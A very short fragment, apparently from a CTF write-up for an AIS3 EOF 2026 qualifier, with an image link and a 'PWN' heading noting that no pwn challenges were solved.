![image](/images/ais3-eof-2026-qual/image_d.png)    
## PWN   
No solved pwn challenges in this CTF. QQ   